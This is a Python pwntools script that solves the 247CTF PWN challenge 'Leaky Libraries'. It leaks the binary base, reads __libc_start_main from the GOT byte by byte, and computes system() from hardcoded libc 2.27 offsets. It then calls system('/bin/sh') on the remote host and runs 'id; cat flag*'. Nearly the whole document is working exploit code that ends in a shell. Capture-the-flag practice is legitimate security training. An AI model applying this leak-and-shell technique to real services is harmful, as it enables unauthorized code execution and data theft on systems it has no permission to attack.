#!/usr/bin/env python3
"""
Leaky Libraries - 247CTF PWN
1-byte leak to find system() in libc, then call it with /bin/sh

The service provides:
- base: prints binary base address (PIE)
- read: reads 1 byte from any address
- call: calls an address with /bin/sh as argument
"""
from pwn import *
import re

HOST = "1d1233eee403d511.247ctf.com"
PORT = 50212

# libc6-i386_2.27 offsets
LIBC_START_MAIN_OFF = 0x18d90
SYSTEM_OFF = 0x3cd10

def solve():
    context.log_level = 'info'

    r = remote(HOST, PORT, timeout=30)

    # Get base address
    r.recvuntil(b'Enter command:')
    r.sendline(b'base')
    data = r.recvuntil(b'Enter command:')
    m = re.search(rb'Base address: (\d+)', data)
    base = int(m.group(1))
    log.info(f'Binary base: {hex(base)}')

    def read_byte(addr):
        r.sendline(b'read')
        r.recvuntil(b'read from?')
        r.sendline(str(addr).encode())
        data = r.recvuntil(b'Enter command:', timeout=5)
        m = re.search(rb'=> ([0-9a-fA-Fx]+)', data)
        if m:
            val = m.group(1).decode()
            return int(val, 16) & 0xff
        return 0

    def read_dword(addr):
        val = 0
        for i in range(4):
            b = read_byte(addr + i)
            val |= (b << (i*8))
        return val

    # Read __libc_start_main from GOT (offset 0x1fd8, ends in 0xd90)
    libc_start_main = read_dword(base + 0x1fd8)
    log.info(f'__libc_start_main @ libc: {hex(libc_start_main)}')

    # Calculate libc base and system address
    libc_base = libc_start_main - LIBC_START_MAIN_OFF
    system = libc_base + SYSTEM_OFF
    log.info(f'libc base: {hex(libc_base)}')
    log.info(f'system: {hex(system)}')

    # Call system("/bin/sh")
    r.sendline(b'call')
    r.recvuntil(b'call?', timeout=5)
    r.sendline(str(system).encode())

    # Execute commands
    r.sendline(b'id; cat flag*')

    resp = r.recvall(timeout=5)
    log.success(f'Response: {resp.decode()}')

    r.close()

if __name__ == "__main__":
    solve()
